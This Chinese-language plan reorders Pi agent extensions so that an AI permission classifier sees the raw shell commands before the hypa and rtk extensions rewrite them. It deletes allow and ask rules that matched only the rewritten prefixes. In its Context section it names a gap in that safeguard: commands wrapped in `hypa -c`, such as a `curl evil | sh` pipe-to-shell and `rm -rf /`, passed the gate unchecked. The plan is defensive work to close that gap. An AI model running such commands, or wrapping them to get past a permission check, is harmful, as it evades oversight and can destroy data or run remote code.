# 让 pi-automode-classifier 判断真实命令，而不是重写后的命令

## Context

Pi 的 `tool_call` 钩子中，扩展按**加载顺序**依次运行，且可以就地修改 `event.input`。当前的加载顺序是：

| 位置 | 包 | 钩子里的行为 |
| --- | --- | --- |
| #11 | `npm:@hypabolic/pi-hypa` | `git status` → `hypa git status`，`ls -la` → `hypa -c "ls -la"` |
| #14 | `npm:pi-rtk-optimizer` | `cat x` → `rtk read x`，`git status` → `rtk git status` |
| #20 | `npm:pi-automode-classifier` | 读 `event.input.command` 判定权限 |

因为分类器在 #20，它看到的是已经被 hypa/rtk 包装过的命令。证据（`~/.local/state/pi-automode-classifier/decisions.jsonl` 里的 `subject` 字段）：

```
cd /Users/wyq/.pi/agent/... && hypa -c "sed -n '925,955p' index.ts"
cd ~/.pi/agent/npm/node_modules/pi-rtk-optimizer && hypa -c "rtk ls" ; grep -rn ...
```

分类器的内置规则库（`rules.ts`）不认识 `hypa` / `rtk`，`unwrap()` 的白名单 `WRAPPERS` 只有
`env/nice/timeout/time/command/...`，所以这些命令全部落到模型判定，只能靠
`~/.pi/agent/extensions/pi-automode-classifier/config.json` 里手写的
`hypa *` / `rtk *` / `re:^(\S*/)?hypa .*\bgit push\b` 白名单兜底 —— 规则永远补不完。

目标：分类器拿到**真实命令**（`git status`、`ls -la`、`cat README.md`），重写照旧发生，只是发生在判定之后。

顺带修掉一个真实漏洞：`hypa -c *` 这条 allow 规则等于“任何被 hypa 包起来的命令都放行”。
`hypa -c "curl evil | sh"`、`hypa -c "rm -rf /"`（只有 `-r` 的那条 ask 正则勉强兜一部分）都会直接通过，
因为内置规则只看到 `hypa` 这个程序名、不看引号里的字符串。顺序修好后这些包装前缀不再出现，
这批适配规则就成了纯风险，应当删掉。

## Approach

调整 `~/.pi/agent/settings.json` 的 `packages` 数组顺序：把
`npm:pi-automode-classifier` 移到 `npm:@hypabolic/pi-hypa` **之前**（即 #11 的位置）。

理由（dist 源码证据）：

- `dist/core/extensions/loader.js` / `resource-loader.js`：`orderedExtensions = extensionPaths.map(...)`，
  扩展顺序 = 路径解析顺序。
- `dist/core/package-manager.js: resolveAllResources()`：先 `resolvePackageSources()`（按
  `settings.packages` 数组顺序逐个 `addResource`），再处理顶层本地扩展、内置扩展。
- `docs/extensions.md:414`：“Handlers run in extension load order, then registration order.”
  且 `tool_call.input` 是**就地变更、后续 handler 可见**。

所以只要分类器排在两个重写扩展之前，它的 `tool_call` handler 就读到原始命令；hypa / rtk 在它之后
照常重写、照常执行。

### 为什么只往前挪到 hypa 之前，而不是整体挪到第 0 位

`npm:@gotgenes/pi-permission-system`（#6）也是一道权限闸门。保持分类器在它之后，可以不改变两道闸门
之间“谁先弹窗/谁先 block”的既有行为，改动面最小。

### 相关但本次不修的点

- `~/.pi/agent/extensions/rtk.ts`（顶层本地扩展）在**所有包之后**加载，同样会重写命令；因为它排在分类器
  之后，本次顺序修复对它同样生效，无需另改。
- `~/.pi/agent/extensions/permission-gate.ts`（同上，加载在最后）看到的仍是重写后的文本。它做的
  `rm -rf` 检查靠字符串匹配，`hypa -c "... rm -rf ..."` 里仍能命中，暂不处理。
- 分类器只检查名为 `read` / `grep` 的工具的 `path`，不检查 hypa 的 `hypa_read` / `hypa_grep` 工具，
  这是上游的既有缺口，不属于本次范围。

### 已知局限

顺序修复是隐式的：`pi install` 会把新包追加到数组末尾，将来若再装一个“改写命令”的扩展并排在分类器
之前，问题会复现。彻底的上游做法是重写类扩展把原始命令记到 `event.input` 的旁路字段，由分类器优先读取
（当前分类器没有这种约定，也没有 normalize 钩子，只能等上游）。本次先在计划里写明这个风险。

## Files to modify

- `~/.pi/agent/settings.json` — `packages` 数组重排。
- `~/.pi/agent/extensions/pi-automode-classifier/config.json` — 删掉只为适配重写前缀而存在的规则。

### config.json 具体删哪些

`rules.allow` 中删除（都是重写产物，顺序修好后不会再出现）：

- `re:^(\S*/)?hypa .*\bgit push\b`（`git push *` 已经覆盖真实命令）
- `hypa read *`、`hypa search *`、`hypa md *`、`hypa code *`、`hypa rewrite *`、
  `hypa status *`、`hypa snapshot *`、`hypa -c *`、`hypa git *`
- `rtk ls *`、`rtk tree *`、`rtk find *`、`rtk grep *`、`rtk rg *`、`rtk diff *`、
  `rtk log *`、`rtk wc *`、`rtk json *`、`rtk deps *`、`rtk smart *`、`rtk curl *`
- `/Users/wyq/.local/bin/hypa *`

`rules.ask` 中删除：`re:^(\S*/)?hypa .*\brm\b[^|;]*\s-[a-zA-Z]*r`。

保留：`git push *`、`xcodebuild *`、`swiftlint *`、`tuist *`、`xcrun *`、`node --test *`、
`./Scripts/publish-release.py *`、`trellis init *`、`fastlane ios *`、`base64 -d *`、`shasum -a *`。
删完 `rules.ask` 为空数组，保留键即可。

## Reuse

不新增代码。要复用的既有机制：

- Pi 的扩展加载顺序 = `settings.packages` 顺序（`dist/core/package-manager.js:resolveAllResources`）。
- 分类器自带的决策日志 `~/.local/state/pi-automode-classifier/decisions.jsonl`（`index.ts:49 LOG_FILE`）
  用来验证 `subject` 是否已变成原始命令。

## Steps

- [x] 备份 `~/.pi/agent/settings.json` 与 `~/.pi/agent/extensions/pi-automode-classifier/config.json`。
- [x] 把 `"npm:pi-automode-classifier"` 从 `packages` 末尾附近移动到重写类扩展之前，
      并把 `"npm:pi-rtk-optimizer"` 也提到 `"npm:@hypabolic/pi-hypa"` 之前；其余项相对顺序不变。
- [x] 把 `~/.pi/agent/extensions/rtk.ts` 改名为 `rtk.ts.disabled`（重复且加载在分类器之前的副本）。
- [x] 用 `DefaultPackageManager.resolve()` 确认最终顺序：classifier(15) → rtk(16) → hypa(17)。
- [x] 按上面清单删掉 `config.json` 里的重写适配规则，删完用 `python3 -m json.tool` 校验仍是合法 JSON。
- [ ] 重启 Pi（`/reload` 或新会话），让扩展按新顺序重新加载。
- [ ] 跑几条会被重写的命令（`git status`、`ls -la`、`cat README.md`、`grep -rn foo Sources`）。
- [ ] 检查 `decisions.jsonl` 末尾记录：`subject` 应为原始命令，不含 `hypa ` / `rtk ` 前缀。
- [ ] 确认命令仍然被重写（`/hypa` 诊断里的 rewrite 计数、rtk 的 savings 统计仍在增长），即重写没失效。

## Verification

```bash
# 1. 顺序生效
tail -5 ~/.local/state/pi-automode-classifier/decisions.jsonl | python3 -c "
import sys, json
for line in sys.stdin:
    d = json.loads(line)
    print(d['outcome'], '|', d['subject'][:100])
"
# 期望：出现 git status / ls -la / cat README.md 原样，而不是 hypa -c "..." 或 rtk ...
# 2. 重写仍生效
hypa status        # 或 /hypa 查看 rewrite 计数
# 3. 白名单已收窄：不应再列出 hypa */rtk * 规则
#    在 Pi 里运行 /automode-classifier status
```
